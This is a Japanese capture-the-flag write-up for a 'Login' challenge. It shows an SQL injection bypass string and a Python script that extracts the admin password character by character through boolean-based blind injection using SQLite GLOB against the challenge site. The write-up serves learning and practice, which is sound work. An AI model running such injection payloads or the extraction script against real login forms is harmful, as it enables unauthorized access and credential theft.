## Login (120pt)
> http://ctfq.u1tramarine.blue/q6/  
> https://ctfq.u1tramarine.blue/q6/

アクセスすると、簡素なログイン画面が表示される。
![](images/img1.png)

とりあえずIDは`admin`、Passは`a' OR 'a' == 'a'; --`としてSQLインジェクションしてみると、今度はこんなページが現れる。
![](images/img2.png)

つまり、`database.db`からどうにかしてadminのパスワードを引っ張り出してくる必要がある。（そのままアクセスしようとしても403を返されるため、SQLを介する必要がある）しかし、DBへの問合せ結果を出力する処理は見当たらないため、単純な`SELECT`では効果が無い。  
どうすれば良いのだろうかと詳解セキュリティコンテストを読んでいたら、Booleanベースの攻撃というものがあるらしい。`LIKE`などのゆるい文字列比較を用いて`TRUE`となる文字列を一文字ずつ探索していく、いわゆる総当たり的な手法である。なお、今回用いられているDB管理システムはsqliteなので、`GLOB`を使う。IDとPassは`POST`で送信しているので、返ってくるHTMLに`Congratulations!`が含まれていれば`TRUE`判定されたとみなすことができる。  
方針が定まったのでソルバを書く。なお、書くにあたってhttps://qiita.com/kk0128/items/3907045802c9b95e7c21 をかなり参考にさせてもらった。
```python
import sys
import requests
from string import printable

url = 'https://ctfq.u1tramarine.blue/q6/'
id_input = 'admin'
flag = ''

while True:
    for char in printable.replace('*', '').replace('?', ''):
        payload = {
            'id': id_input,
            'pass': f"a' OR pass GLOB '{flag}{char}*';"
        }
        response = requests.post(url, data=payload)

        if 'Congratulations!' in response.text:
            flag += char
            print(f'HIT, {flag}')
            payload_2 = {
                'id': id_input,
                'pass': flag
            }
            response_2 = requests.post(url, data=payload_2) # 現在のflagでログインが通るか？
            if 'Congratulations!' in response_2.text:
                sys.exit('Found a flag')    # ログイン成功=フラグ完成 として終了
```

実行してみたところ、2分30秒くらいでフラグが完成した。そして作った後になって"FLAG_"は省略できるということに気付いた。やり方次第では更にもう少し早くできるのかもしれない。